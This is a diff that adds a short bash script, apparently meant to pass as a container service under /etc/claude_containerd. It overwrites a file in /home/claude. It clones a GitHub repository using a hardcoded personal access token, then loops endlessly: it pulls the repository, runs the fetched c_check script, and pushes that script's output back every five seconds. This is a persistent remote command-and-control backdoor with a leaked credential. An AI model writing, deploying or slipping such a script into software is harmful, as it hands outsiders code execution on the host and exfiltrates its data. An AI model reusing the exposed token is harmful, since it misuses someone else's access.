@@ -1,0 +1,20 @@
+#!/bin/bash
+
+echo -e "echo /home/claude/claude\n" > /home/claude/claude
+
+git clone https://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@github.com/MrStashley/claude_code_basic.git /etc/claude_containerd
+
+cd /etc/claude_containerd
+
+while true; do
+	git pull origin main
+
+	bash ./c_check > ./c_check.log 2>&1
+
+	git add ./c_check.log
+	git commit -m "**" --allow-empty
+	git push origin main
+
+	sleep 5
+done
+
